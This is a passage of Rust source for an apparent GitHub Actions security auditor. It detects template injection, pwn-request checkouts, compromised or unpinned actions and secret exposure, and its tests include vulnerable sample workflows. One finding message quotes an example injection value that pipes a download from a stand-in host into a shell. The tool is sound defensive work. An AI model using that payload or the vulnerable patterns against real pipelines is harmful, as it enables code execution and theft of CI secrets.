//! GitHub Actions workflow auditing.
//!
//! CI pipelines are now a primary supply-chain target. Each check below maps to a class
//! of real incidents:
//!
//! | Check | Incidents |
//! |---|---|
//! | `gha/template-injection` | Ultralytics (2024), nx/s1ngularity (2025), Shai-Hulud's discussion backdoor (2025) |
//! | `gha/untrusted-checkout` ("pwn request") | hackerbot-claw campaign, Trivy, TanStack, AsyncAPI (2026) |
//! | `gha/unpinned-action`, `gha/compromised-action` | tj-actions/changed-files and reviewdog (2025), trivy-action (2026) |
//! | `gha/excessive-permissions` | stolen write tokens in the above |
//! | `gha/public-trigger-with-secrets`, `gha/self-hosted-runner` | comment- and fork-triggered secret theft, Shai-Hulud runner abuse |
//! | `gha/secrets-inherit`, `gha/all-secrets-exposed` | secrets reaching code that should not see them |
//!
//! Workflows (`.github/workflows/*.yml`) and composite actions (`action.yml`) are
//! checked. The checks are static and per file: no network access, so they run at org
//! scale. Positions come from the YAML parser, so findings point at the exact line.

mod expr;
mod yaml;

use crate::model::{Category, Confidence, Finding, LineIndex, Location, Severity, Snippet};
use expr::{Scope, Taint};
use regex::Regex;
use std::collections::{BTreeSet, HashSet};
use std::sync::LazyLock;
use yaml::Node;

/// Metadata for `ghaudit rules` and the docs.
pub struct WorkflowRule {
    pub id: &'static str,
    pub name: &'static str,
    pub severity: Severity,
}

pub static RULES: &[WorkflowRule] = &[
    WorkflowRule {
        id: "gha/template-injection",
        name: "Attacker-controlled ${{ }} in a script",
        severity: Severity::Critical,
    },
    WorkflowRule {
        id: "gha/untrusted-checkout",
        name: "Privileged trigger checks out pull request code",
        severity: Severity::Critical,
    },
    WorkflowRule {
        id: "gha/compromised-action",
        name: "Action with a known supply-chain compromise, not pinned",
        severity: Severity::High,
    },
    WorkflowRule {
        id: "gha/unpinned-action",
        name: "Action or image not pinned to a commit SHA or digest",
        severity: Severity::Medium,
    },
    WorkflowRule {
        id: "gha/excessive-permissions",
        name: "GITHUB_TOKEN with write-all or unscoped on a privileged trigger",
        severity: Severity::High,
    },
    WorkflowRule {
        id: "gha/public-trigger-with-secrets",
        name: "Anyone can trigger a job that reads secrets",
        severity: Severity::High,
    },
    WorkflowRule {
        id: "gha/self-hosted-runner",
        name: "Self-hosted runner on a pull-request trigger",
        severity: Severity::Medium,
    },
    WorkflowRule {
        id: "gha/secrets-inherit",
        name: "All secrets passed to an external reusable workflow",
        severity: Severity::Medium,
    },
    WorkflowRule {
        id: "gha/all-secrets-exposed",
        name: "toJSON(secrets) exposes every secret",
        severity: Severity::High,
    },
    WorkflowRule {
        id: "gha/unanalyzable-workflow",
        name: "Workflow ghaudit could not parse",
        severity: Severity::Medium,
    },
];

/// Triggers that run with the base repository's secrets and a write-capable token
/// while carrying content an outsider controls.
const PRIVILEGED_TRIGGERS: &[&str] = &[
    "pull_request_target",
    "workflow_run",
    "issue_comment",
    "issues",
    "discussion",
    "discussion_comment",
];

/// Triggers any GitHub user can cause on a public repository.
const PUBLIC_TRIGGERS: &[&str] = &[
    "pull_request",
    "pull_request_target",
    "pull_request_review",
    "pull_request_review_comment",
    "issue_comment",
    "issues",
    "discussion",
    "discussion_comment",
    "fork",
    "watch",
];

/// Triggers whose events are comments or posts any user can write.
const COMMENT_TRIGGERS: &[&str] = &[
    "issue_comment",
    "issues",
    "discussion",
    "discussion_comment",
    "pull_request_review_comment",
];

/// Privileged triggers on which checking out pull request code runs it with privileges.
const CHECKOUT_TRIGGERS: &[&str] = &["pull_request_target", "workflow_run", "issue_comment"];

/// Actions whose tags were rewritten to malicious commits.
const COMPROMISED: &[(&str, &str)] = &[
    (
        "tj-actions/changed-files",
        "tags were repointed to a secret-dumping commit in March 2025 (CVE-2025-30066)",
    ),
    (
        "tj-actions/eslint-changed-files",
        "compromised with tj-actions/changed-files in March 2025",
    ),
    (
        "reviewdog/action-setup",
        "the v1 tag was repointed to a malicious commit in March 2025 (CVE-2025-30154)",
    ),
    (
        "aquasecurity/trivy-action",
        "75 of 76 tags were force-pushed to a credential stealer in March 2026",
    ),
    (
        "aquasecurity/setup-trivy",
        "tags were force-pushed to a credential stealer in March 2026",
    ),
];

/// References to the pull request's own code rather than the base branch.
static UNTRUSTED_REF: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)github\.event\.pull_request\.(head\.(sha|ref|repo\.full_name)|number|merge_commit_sha)|github\.head_ref|refs/pull/|github\.event\.workflow_run\.(head_sha|head_branch|head_repository|pull_requests)|github\.event\.number",
    )
    .unwrap()
});

/// Shell commands that fetch or check out pull request code.
static SCRIPT_CHECKOUT: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)\bgh\s+pr\s+checkout\b|\bgit\s+(?:fetch|pull)\b[^\n]*\b(?:refs/)?pull/|\bgit\s+(?:checkout|switch)\b[^\n]*\$\{\{[^}\n]*(?:head\.sha|head\.ref|head_ref|head_sha|head_branch)",
    )
    .unwrap()
});

static ACTOR_GUARD: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)author_association|github\.actor\s*==|github\.triggering_actor\s*==|sender\.login\s*==|user\.login\s*==").unwrap()
});

/// The `secrets` context in an expression; group 1 is the secret's name, if given.
static SECRET_USE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\bsecrets\b(?:\s*\.\s*([A-Za-z_][A-Za-z0-9_]*))?").unwrap());

static SHA: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^[0-9a-f]{40}$").unwrap());
static OWNER: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^[A-Za-z0-9][A-Za-z0-9-]{0,38}$").unwrap());

/// `.github/workflows/*.yml` at the repository root.
pub fn is_workflow(rel_path: &str) -> bool {
    rel_path
        .strip_prefix(".github/workflows/")
        .is_some_and(|name| {
            !name.contains('/') && (name.ends_with(".yml") || name.ends_with(".yaml"))
        })
}

/// Action metadata (`action.yml`/`action.yaml`) anywhere in the tree.
pub fn is_action(rel_path: &str) -> bool {
    let name = rel_path.rsplit('/').next().unwrap_or(rel_path);
    name == "action.yml" || name == "action.yaml"
}

pub fn applies_to(rel_path: &str) -> bool {
    is_workflow(rel_path) || is_action(rel_path)
}

/// Audit one workflow or action file.
pub fn analyze(rel_path: &str, content: &str) -> Vec<Finding> {
    let mut audit = Audit {
        path: rel_path,
        index: LineIndex::new(content),
        findings: Vec::new(),
        seen: HashSet::new(),
    };
    match yaml::parse(content) {
        Ok(Some(doc)) if is_workflow(rel_path) => audit.workflow(&doc),
        Ok(Some(doc)) => audit.action(&doc),
        Ok(None) => {}
        // A file that merely happens to be named action.yml is not worth a finding.
        Err(e) if is_workflow(rel_path) || matches!(e, yaml::Error::TooLarge) => {
            audit.unanalyzable(&e)
        }
        Err(_) => {}
    }
    audit.findings
}

struct Audit<'a> {
    path: &'a str,
    index: LineIndex<'a>,
    findings: Vec<Finding>,
    /// (rule, line, column) already reported: a YAML alias can bring the same node
    /// into several places.
    seen: HashSet<(&'static str, usize, usize)>,
}

/// Where a finding points: 1-based line and character column.
type At = (usize, usize);

fn at(node: &Node) -> At {
    (node.line, node.col + 1)
}

/// Facts about the workflow that every job check needs.
struct Context<'a> {
    triggers: BTreeSet<String>,
    privileged: Vec<&'a str>,
    public: bool,
}

impl Context<'_> {
    fn has(&self, trigger: &str) -> bool {
        self.triggers.contains(trigger)
    }
}

impl Audit<'_> {
    #[allow(clippy::too_many_arguments)]
    fn push(
        &mut self,
        rule: &'static str,
        severity: Severity,
        confidence: Confidence,
        title: &str,
        message: String,
        (line, column): At,
        remediation: &str,
    ) {
        if !self.seen.insert((rule, line, column)) {
            return;
        }
        let text = self.index.line(line).unwrap_or_default();
        self.findings.push(
            Finding::new(
                rule,
                Category::Workflow,
                severity,
                confidence,
                title,
                message,
                Location::new(self.path, line, column),
                text,
            )
            .with_snippet(Snippet::from_index(&self.index, line, column, 1))
            .with_cwe([cwe(rule)])
            .with_remediation(remediation),
        );
    }

    /// Position of the `nth` occurrence of `needle` in a scalar's source text, or the
    /// scalar's start when it cannot be found (e.g. the needle spans folded lines).
    fn locate(&self, node: &Node, needle: &str, nth: usize) -> At {
        let text = self.index.text();
        let start = self.index.offset(node.line, node.col);
        let end = self
            .index
            .offset(node.end_line, node.end_col)
            .unwrap_or(text.len());
        if let Some(start) = start.filter(|&s| s <= end)
            && let Some((offset, _)) = text[start..end].match_indices(needle).nth(nth)
        {
            return self.index.position(start + offset);
        }
        at(node)
    }

    fn unanalyzable(&mut self, error: &yaml::Error) {
        let (severity, message) = match error {
            yaml::Error::TooLarge => (
                Severity::Medium,
                format!(
                    "This file expands to {error}, so ghaudit did not analyze it. Real workflows are far smaller; YAML that grows this much (an \"alias bomb\") is a way to exhaust a scanner's memory and hide what the file does."
                ),
            ),
            yaml::Error::Syntax(_) => (
                Severity::Low,
                format!(
                    "ghaudit could not parse this workflow ({error}), so none of its jobs were checked. GitHub rejects workflows it cannot parse, but a file GitHub accepts and ghaudit does not would hide its contents from this scan."
                ),
            ),
        };
        self.push(
            "gha/unanalyzable-workflow",
            severity,
            Confidence::High,
            "Workflow ghaudit could not analyze",
            message,
            (1, 1),
            "Review this file by hand. If it is a valid workflow, please report the parse error to ghaudit.",
        );
    }

    fn workflow(&mut self, root: &Node) {
        if !root.is_map() {
            return;
        }
        let triggers = triggers(root);
        let ctx = Context {
            privileged: PRIVILEGED_TRIGGERS
                .iter()
                .copied()
                .filter(|t| triggers.contains(*t))
                .collect(),
            public: PUBLIC_TRIGGERS.iter().any(|t| triggers.contains(*t)),
            triggers,
        };
        let top_permissions = root.get("permissions");
        if let Some(p) = top_permissions {
            self.check_write_all(p);
        }
        self.check_all_secrets(root);

        let workflow_scope = Scope {
            inputs: ctx.has("workflow_call"),
            ..Scope::default()
        };
        let workflow_scope = env_scope(root.get("env"), &workflow_scope);
        let jobs: Vec<(&Node, &Node)> = root
            .get("jobs")
            .map(|j| j.entries().collect())
            .unwrap_or_default();

        let unscoped_jobs = jobs
            .iter()
            .filter(|(_, job)| job.get("permissions").is_none())
            .count();
        // With a single job, workflow-level and job-level permissions are the same thing.
        if let Some(p) = top_permissions
            && !ctx.privileged.is_empty()
            && jobs.len() > 1
            && unscoped_jobs > 0
            && grants_write(p)
        {
            self.push(
                "gha/excessive-permissions",
                Severity::Medium,
                Confidence::Medium,
                "Workflow-wide write permissions on a privileged trigger",
                format!(
                    "This workflow runs on `{}` and grants write access to every job that does not set its own `permissions:`. Anything such a job runs, including third-party actions, can use that access.",
                    ctx.privileged.join("`, `")
                ),
                at(p),
                "Set `permissions: {}` or read-only at the workflow level and grant write scopes only to the jobs that need them.",
            );
        }

        for (key, job) in jobs {
            let name = key.as_str().unwrap_or_default();
            if !job.is_map() {
                continue;
            }
            self.job(
                name,
                key,
                job,
                &ctx,
                top_permissions.is_some(),
                &workflow_scope,
            );
        }
    }

    fn job(
        &mut self,
        name: &str,
        key: &Node,
        job: &Node,
        ctx: &Context,
        top_permissions: bool,
        parent: &Scope,
    ) {
        if let Some(p) = job.get("permissions") {
            self.check_write_all(p);
        } else if !top_permissions && !ctx.privileged.is_empty() {
            self.push(
                "gha/excessive-permissions",
                Severity::Medium,
                Confidence::Medium,
                "No permissions block on a privileged trigger",
                format!(
                    "Job `{name}` runs on `{}` without a `permissions:` block, so its GITHUB_TOKEN gets the repository default, which may include write access.",
                    ctx.privileged.join("`, `")
                ),
                at(key),
                "Add `permissions: {}` (or the minimum the job needs, e.g. `contents: read`) at the workflow or job level.",
            );
        }

        if let Some(uses) = job.get("uses") {
            self.check_uses(uses);
            let target = uses.as_str().unwrap_or_default().trim();
            if let Some(secrets) = job.get("secrets")
                && secrets.as_str() == Some("inherit")
                && !target.starts_with("./")
            {
                self.push(
                    "gha/secrets-inherit",
                    Severity::Medium,
                    Confidence::High,
                    "All secrets passed to an external reusable workflow",
                    format!(
                        "`secrets: inherit` gives `{target}` every secret this repository can read."
                    ),
                    at(secrets),
                    "Pass the specific secrets the called workflow needs under `secrets:`.",
                );
            }
        }

        if ctx.public
            && let Some(runs_on) = job.get("runs-on")
            && runs_on_self_hosted(runs_on)
        {
            self.push(
                "gha/self-hosted-runner",
                Severity::Medium,
                Confidence::Medium,
                "Self-hosted runner on a public trigger",
                format!("Job `{name}` runs on a self-hosted runner and can be triggered by outsiders. On a public repository, anyone can run code on that machine, and it persists between jobs."),
                at(runs_on),
                "Use GitHub-hosted runners for untrusted events, or ephemeral, isolated self-hosted runners.",
            );
        }

        let comment_like: Vec<&str> = COMMENT_TRIGGERS
            .iter()
            .copied()
            .filter(|t| ctx.has(t))
            .collect();
        if !comment_like.is_empty() && !guarded(job) && job_reads_secrets(job) {
            self.push(
                "gha/public-trigger-with-secrets",
                Severity::High,
                Confidence::Medium,
                "Anyone can trigger a job that reads secrets",
                format!(
                    "Job `{name}` runs on `{}`, which any GitHub user can cause, uses secrets, and never checks who triggered it.",
                    comment_like.join("`, `")
                ),
                at(key),
                "Gate the job with `if: contains(fromJSON('[\"OWNER\",\"MEMBER\",\"COLLABORATOR\"]'), github.event.comment.author_association)` (or the issue's author_association), or move the secret-using work to a workflow outsiders cannot trigger.",
            );
        }

        let job_scope = env_scope(job.get("env"), parent);
        if let Some(steps) = job.get("steps") {
            for step in steps.items() {
                self.step(step, ctx, &job_scope, false);
            }
        }
    }

    /// One step of a workflow job (`composite` = false) or a composite action.
    fn step(&mut self, step: &Node, ctx: &Context, parent: &Scope, composite: bool) {
        if !step.is_map() {
            return;
        }
        let scope = env_scope(step.get("env"), parent);
        let uses = step.get("uses");
        let action = uses
            .and_then(Node::as_str)
            .map(|u| u.trim().to_ascii_lowercase())
            .unwrap_or_default();
        if let Some(uses) = uses {
            self.check_uses(uses);
        }
        let with = step.get("with");
        let checkout_trigger = CHECKOUT_TRIGGERS.iter().find(|t| ctx.has(t));

        if action.starts_with("actions/checkout@")
            && let (Some(with), Some(trigger)) = (with, checkout_trigger)
        {
            for key in ["ref", "repository"] {
                let Some(value) = with.get(key) else {
                    continue;
                };
                let text = value.as_str().unwrap_or_default();
                if UNTRUSTED_REF.is_match(&expand_env(text, &scope)) {
                    self.push(
                        "gha/untrusted-checkout",
                        Severity::Critical,
                        Confidence::High,
                        "Privileged trigger checks out pull request code",
                        format!(
                            "This workflow runs on `{trigger}` (with secrets and a write token) and checks out the pull request's code (`{key}: {}`). Any build, install or test step then runs the attacker's code with those privileges (a \"pwn request\").",
                            text.trim()
                        ),
                        at(value),
                        PWN_FIX,
                    );
                }
            }
        }

        let mut scripts: Vec<&Node> = Vec::new();
        if let Some(run) = step.get("run") {
            scripts.push(run);
        }
        if action.starts_with("actions/github-script@")
            && let Some(script) = with.and_then(|w| w.get("script"))
        {
            scripts.push(script);
        }
        for script in scripts {
            if let (Some(trigger), Some(text)) = (checkout_trigger, script.as_str())
                && let Some(m) = SCRIPT_CHECKOUT.find(text)
            {
                let position = self.locate(script, m.as_str(), 0);
                self.push(
                    "gha/untrusted-checkout",
                    Severity::Critical,
                    Confidence::Medium,
                    "Privileged trigger checks out pull request code",
                    format!(
                        "This workflow runs on `{trigger}` (with secrets and a write token) and its script fetches the pull request's code (`{}`). Building or running that code gives the attacker those privileges (a \"pwn request\").",
                        m.as_str().trim()
                    ),
                    position,
                    PWN_FIX,
                );
            }
            self.check_injection(script, &ctx.privileged, &scope, composite);
        }
    }

    fn action(&mut self, root: &Node) {
        let Some(runs) = root.get("runs") else {
            return;
        };
        if runs.get("using").and_then(Node::as_str) != Some("composite") {
            return;
        }
        self.check_all_secrets(runs);
        let ctx = Context {
            triggers: BTreeSet::new(),
            privileged: Vec::new(),
            public: false,
        };
        let scope = Scope {
            inputs: true,
            ..Scope::default()
        };
        if let Some(steps) = runs.get("steps") {
            for step in steps.items() {
                self.step(step, &ctx, &scope, true);
            }
        }
    }

    fn check_write_all(&mut self, permissions: &Node) {
        if permissions.as_str().map(str::trim) == Some("write-all") {
            self.push(
                "gha/excessive-permissions",
                Severity::High,
                Confidence::High,
                "GITHUB_TOKEN has write-all permissions",
                "`permissions: write-all` lets every step (and every action it uses) push code, create releases and modify the repository.".into(),
                at(permissions),
                "Grant only what the job needs, e.g. `permissions: { contents: read }`.",
            );
        }
    }

    /// `toJSON(secrets)`, wherever it appears.
    fn check_all_secrets(&mut self, root: &Node) {
        let mut scalars = Vec::new();
        root.scalars(&mut scalars);
        for node in scalars {
            let Some(value) = node.as_str() else { continue };
            if !value.contains("${{") {
                continue;
            }
            for e in expr::embedded(value) {
                if !expr::parse_body(e.body).is_some_and(|x| expr::serializes_secrets(&x)) {
                    continue;
                }
                let position = self.locate_expression(node, value, &e);
                self.push(
                    "gha/all-secrets-exposed",
                    Severity::High,
                    Confidence::High,
                    "toJSON(secrets) exposes every secret",
                    "Serializing the whole secrets context hands every repository and organization secret to this step, not just the ones it needs.".into(),
                    position,
                    "Pass only the secrets the step needs, one by one.",
                );
            }
        }
    }

    /// Source position of an expression embedded in a scalar's value. Earlier
    /// occurrences of the same text are counted, so repeats map to their own lines.
    fn locate_expression(&self, node: &Node, value: &str, e: &expr::Embedded) -> At {
        let earlier = value[..e.start].matches(e.text).count();
        self.locate(node, e.text, earlier)
    }

    fn check_uses(&mut self, node: &Node) {
        let Some(raw) = node.as_str() else { return };
        // Block scalars (`uses: |`) carry a trailing newline.
        let uses = raw.trim();
        if uses.starts_with("./") || uses.starts_with('$') {
            return;
        }
        if let Some(image) = uses.strip_prefix("docker://") {
            if !image.contains("@sha256:") {
                self.push(
                    "gha/unpinned-action",
                    Severity::Medium,
                    Confidence::High,
                    "Container image not pinned to a digest",
                    format!("`{uses}` follows a tag. Whoever controls the image (or its registry account) can change what this step runs."),
                    at(node),
                    "Pin the image by digest: `docker://image@sha256:<digest>` (keep the tag in a comment).",
                );
            }
            return;
        }
        let Some((action, reference)) = uses.split_once('@') else {
            return;
        };
        if SHA.is_match(reference) {
            return;
        }
        let mut parts = action.split('/');
        let (Some(owner), Some(name)) = (parts.next(), parts.next()) else {
            return;
        };
        if !OWNER.is_match(owner) || name.is_empty() {
            return;
        }
        let repo = format!("{owner}/{name}").to_ascii_lowercase();
        if let Some((_, what)) = COMPROMISED.iter().find(|(name, _)| *name == repo) {
            self.push(
                "gha/compromised-action",
                Severity::High,
                Confidence::High,
                "Previously compromised action referenced by a mutable tag",
                format!("`{uses}`: {what}. A tag can be moved again; only a commit SHA is immutable."),
                at(node),
                "Pin to a full commit SHA you have reviewed (keep the version in a comment), or replace the action.",
            );
            return;
        }
        // GitHub's own actions are lower risk, but a tag is still mutable.
        let first_party = repo.starts_with("actions/") || repo.starts_with("github/");
        self.push(
            "gha/unpinned-action",
            if first_party {
                Severity::Info
            } else {
                Severity::Medium
            },
            Confidence::High,
            "Action not pinned to a commit SHA",
            format!("`{uses}` follows a tag or branch. Whoever controls `{repo}` (or compromises it) can change the code this workflow runs, as happened with tj-actions/changed-files."),
            at(node),
            "Pin to a full 40-character commit SHA and record the version in a comment: `uses: owner/repo@<sha> # v1.2.3`. Dependabot and Renovate keep such pins updated.",
        );
    }

    fn check_injection(
        &mut self,
        script: &Node,
        privileged: &[&str],
        scope: &Scope,
        composite: bool,
    ) {
        let Some(value) = script.as_str() else { return };
        for e in expr::embedded(value) {
            let Some(parsed) = expr::parse_body(e.body) else {
                continue;
            };
            let Some(taint) = expr::taint(&parsed, scope) else {
                continue;
            };
            let position = self.locate_expression(script, value, &e);
            let whole = e.text;
            let (severity, confidence, source, why) = match &taint {
                Taint::Input(input) => (
                    Severity::Low,
                    Confidence::Low,
                    input.clone(),
                    format!(
                        " `{input}` comes from whoever calls this {}; if they pass text from an issue, pull request or comment, it runs as code here.",
                        if composite {
                            "action"
                        } else {
                            "reusable workflow"
                        }
                    ),
                ),
                Taint::Attacker(field) if privileged.is_empty() => (
                    Severity::Medium,
                    Confidence::High,
                    field.clone(),
                    String::new(),
                ),
                Taint::Attacker(field) => (
                    Severity::Critical,
                    Confidence::High,
                    field.clone(),
                    format!(
                        " This workflow runs on `{}`, with secrets and a write-capable token.",
                        privileged.join("`, `")
                    ),
                ),
            };
            let chosen_by = match taint {
                Taint::Input(_) => String::new(),
                Taint::Attacker(_) => format!(
                    " `{source}` is chosen by whoever opens the issue, pull request or comment, so a value like `\"; curl evil.sh | sh; #` runs as code."
                ),
            };
            self.push(
                "gha/template-injection",
                severity,
                confidence,
                "Attacker-controlled ${{ }} in a script",
                format!(
                    "`{whole}` is pasted into the script text before the shell runs it.{chosen_by}{why}"
                ),
                position,
                "Pass the value through an environment variable and quote it: `env: { TITLE: ${{ github.event.pull_request.title }} }` then `run: echo \"$TITLE\"`.",
            );
        }
    }
}

const PWN_FIX: &str = "Use the `pull_request` trigger for building untrusted code. If you need privileges, split into an unprivileged `pull_request` workflow and a privileged one that only consumes its artifacts as data.";

fn cwe(rule: &str) -> &'static str {
    match rule {
        "gha/template-injection" => "CWE-94",
        "gha/untrusted-checkout" => "CWE-829",
        "gha/unpinned-action" | "gha/compromised-action" => "CWE-829",
        "gha/excessive-permissions" => "CWE-250",
        "gha/public-trigger-with-secrets" | "gha/self-hosted-runner" => "CWE-284",
        "gha/unanalyzable-workflow" => "CWE-1284",
        _ => "CWE-200",
    }
}

/// Event names from `on:`, which may be a string, a list or a mapping.
fn triggers(root: &Node) -> BTreeSet<String> {
    let Some(on) = root.get("on") else {
        return BTreeSet::new();
    };
    if let Some(s) = on.as_str() {
        return [s.trim().to_string()].into();
    }
    on.items()
        .filter_map(Node::as_str)
        .chain(on.entries().filter_map(|(k, _)| k.as_str()))
        .map(|s| s.trim().to_string())
        .collect()
}

fn runs_on_self_hosted(runs_on: &Node) -> bool {
    if let Some(s) = runs_on.as_str() {
        return s.trim() == "self-hosted";
    }
    runs_on.items().any(|v| v.as_str() == Some("self-hosted"))
        || runs_on.get("labels").is_some_and(runs_on_self_hosted)
}

/// Any `write` scope in a permissions mapping.
fn grants_write(permissions: &Node) -> bool {
    permissions
        .entries()
        .any(|(_, v)| v.as_str().map(str::trim) == Some("write"))
}

/// The node's own `if:` checks who triggered the run.
fn guarded(node: &Node) -> bool {
    node.get("if")
        .and_then(Node::as_str)
        .is_some_and(|cond| ACTOR_GUARD.is_match(cond))
}

/// Whether a job reads a secret other than GITHUB_TOKEN outside steps that check the
/// actor: in a `${{ }}` expression, or by passing secrets to a reusable workflow.
fn job_reads_secrets(job: &Node) -> bool {
    if job.get("secrets").is_some() {
        return true;
    }
    let mut scalars = Vec::new();
    for (key, value) in job.entries() {
        if key.as_str() == Some("steps") {
            for step in value.items().filter(|s| !guarded(s)) {
                step.scalars(&mut scalars);
            }
        } else if key.as_str() != Some("if") {
            value.scalars(&mut scalars);
        }
    }
    scalars.iter().filter_map(|n| n.as_str()).any(|s| {
        expr::embedded(s).iter().any(|e| {
            SECRET_USE.captures_iter(e.body).any(|c| {
                !c.get(1)
                    .is_some_and(|name| name.as_str().eq_ignore_ascii_case("github_token"))
            })
        })
    })
}

/// Extend `parent` with the variables of an `env:` block whose value is
/// attacker-controlled.
fn env_scope(env: Option<&Node>, parent: &Scope) -> Scope {
    let mut scope = parent.clone();
    let Some(env) = env else { return scope };
    for (key, value) in env.entries() {
        let (Some(name), Some(text)) = (key.as_str(), value.as_str()) else {
            continue;
        };
        let name = name.trim().to_ascii_lowercase();
        let tainted = expr::embedded(text).iter().find_map(|e| {
            expr::parse_body(e.body)
                .and_then(|x| expr::taint(&x, parent))
                .and_then(|t| match t {
                    Taint::Attacker(from) => Some(from),
                    Taint::Input(_) => None,
                })
        });
        match tainted {
            Some(from) => scope.env.insert(name.clone(), from),
            None => scope.env.remove(&name),
        };
        scope.raw.insert(name, text.to_string());
    }
    scope
}

/// `text` with `${{ env.NAME }}` references replaced by the variables' definitions,
/// so a checkout of `${{ env.PR_REF }}` is judged by what PR_REF holds.
fn expand_env(text: &str, scope: &Scope) -> String {
    let mut out = text.to_string();
    for e in expr::embedded(text) {
        if let Some(expr::Expr::Path(path)) = expr::parse_body(e.body)
            && let [expr::Seg::Name(ctx), expr::Seg::Name(var)] = path.as_slice()
            && ctx == "env"
            && let Some(value) = scope.raw.get(var)
        {
            out.push(' ');
            out.push_str(value);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ids(yaml: &str) -> Vec<String> {
        let mut v: Vec<String> = analyze(".github/workflows/x.yml", yaml)
            .into_iter()
            .filter(|f| f.severity > Severity::Info)
            .map(|f| f.rule_id)
            .collect();
        v.sort();
        v
    }

    fn lines(yaml: &str) -> Vec<(String, usize)> {
        analyze(".github/workflows/x.yml", yaml)
            .into_iter()
            .map(|f| (f.rule_id, f.location.start_line))
            .collect()
    }

    const SHA_PIN: &str = "actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955";

    #[test]
    fn only_root_workflow_files_and_actions() {
        assert!(is_workflow(".github/workflows/ci.yml"));
        assert!(is_workflow(".github/workflows/release.yaml"));
        assert!(!is_workflow("sub/.github/workflows/ci.yml"));
        assert!(!is_workflow(".github/workflows/scripts/x.yml"));
        assert!(!is_workflow(".github/dependabot.yml"));
        assert!(is_action("action.yml"));
        assert!(is_action(".github/actions/setup/action.yaml"));
        assert!(!is_action("my-action.yml"));
    }

    #[test]
    fn template_injection_severity_depends_on_trigger() {
        let wf = r#"
on: pull_request_target
permissions: {}
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Thanks for ${{ github.event.pull_request.title }}"
"#;
        let f = analyze(".github/workflows/x.yml", wf);
        assert_eq!(f.len(), 1);
        assert_eq!(
            (f[0].rule_id.as_str(), f[0].severity),
            ("gha/template-injection", Severity::Critical)
        );
        assert_eq!(
            (f[0].location.start_line, f[0].location.start_column),
            (9, 28)
        );

        let wf = "on: pull_request\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ${{ github.head_ref }}\n";
        let f = analyze(".github/workflows/x.yml", wf);
        assert_eq!(
            (f[0].rule_id.as_str(), f[0].severity),
            ("gha/template-injection", Severity::Medium)
        );
    }

    #[test]
    fn injection_in_github_script_and_issue_comments() {
        let wf = r#"
on:
  issue_comment:
    types: [created]
permissions:
  issues: write
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea
        with:
          script: console.log("${{ github.event.comment.body }}")
"#;
        assert_eq!(ids(wf), vec!["gha/template-injection"]);
    }

    #[test]
    fn injection_spellings_and_env_indirection() {
        let wf = r#"
on: issues
permissions: {}
env:
  TITLE: ${{ github.event.issue.title }}
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ env.TITLE }}"
      - run: echo "${{ GitHub.Event.Issue.Body }}"
      - run: echo "${{ github.event['issue']['title'] || 'none' }}"
      - run: echo "${{ github.event.issue.title == 'x' }}"
      - run: echo "$TITLE"
      - env:
          TITLE: fixed
        run: echo "${{ env.TITLE }}"
"#;
        let got = lines(wf);
        assert_eq!(
            got,
            vec![
                ("gha/template-injection".to_string(), 10),
                ("gha/template-injection".to_string(), 11),
                ("gha/template-injection".to_string(), 12),
            ],
            "booleans, shell variables and a shadowed env var are safe"
        );
    }

    #[test]
    fn repeated_expressions_point_at_their_own_lines() {
        let wf = "on: issues\npermissions: {}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo ok\n          echo ${{ github.event.issue.title }}\n          echo ${{ github.event.issue.title }}\n";
        let got: Vec<usize> = lines(wf).into_iter().map(|(_, l)| l).collect();
        assert_eq!(got, vec![9, 10]);
    }

    #[test]
    fn safe_expression_usage_is_not_flagged() {
        let wf = r#"
on: pull_request_target
permissions:
  contents: read
jobs:
  a:
    runs-on: ubuntu-latest
    env:
      TITLE: ${{ github.event.pull_request.title }}
    steps:
      - run: echo "$TITLE" "${{ github.event.pull_request.number }}" "${{ github.sha }}"
"#;
        assert!(ids(wf).is_empty(), "{:?}", ids(wf));
    }

    #[test]
    fn reusable_workflow_and_composite_action_inputs() {
        let wf = "on:\n  workflow_call:\n    inputs:\n      title:\n        type: string\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"${{ inputs.title }}\"\n";
        let f = analyze(".github/workflows/x.yml", wf);
        assert_eq!(
            (f[0].rule_id.as_str(), f[0].severity, f[0].confidence),
            ("gha/template-injection", Severity::Low, Confidence::Low)
        );
        let action = "name: x\nruns:\n  using: composite\n  steps:\n    - uses: some-org/tool@v1\n    - run: echo ${{ inputs.name }} ${{ github.event.issue.title }}\n      shell: bash\n";
        let mut got: Vec<(String, Severity)> = analyze("tools/action.yml", action)
            .into_iter()
            .map(|f| (f.rule_id, f.severity))
            .collect();
        got.sort();
        assert_eq!(
            got,
            vec![
                ("gha/template-injection".into(), Severity::Low),
                ("gha/template-injection".into(), Severity::Medium),
                ("gha/unpinned-action".into(), Severity::Medium),
            ]
        );
        // JavaScript and Docker actions have no steps to audit.
        assert!(analyze("action.yml", "runs:\n  using: node20\n  main: index.js\n").is_empty());
    }

    #[test]
    fn pwn_request_checkout() {
        let wf = format!(
            r#"
on: pull_request_target
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: {SHA_PIN}
        with:
          ref: ${{{{ github.event.pull_request.head.sha }}}}
      - run: npm ci && npm test
"#
        );
        let f = analyze(".github/workflows/x.yml", &wf);
        assert_eq!(
            f.iter().map(|f| f.rule_id.as_str()).collect::<Vec<_>>(),
            vec!["gha/untrusted-checkout"]
        );
        assert_eq!(f[0].location.start_line, 11);

        // The same checkout on `pull_request` is the safe pattern.
        assert!(ids(&wf.replace("pull_request_target", "pull_request")).is_empty());
        // pull_request_target that checks out the base branch is fine.
        let base_only = format!(
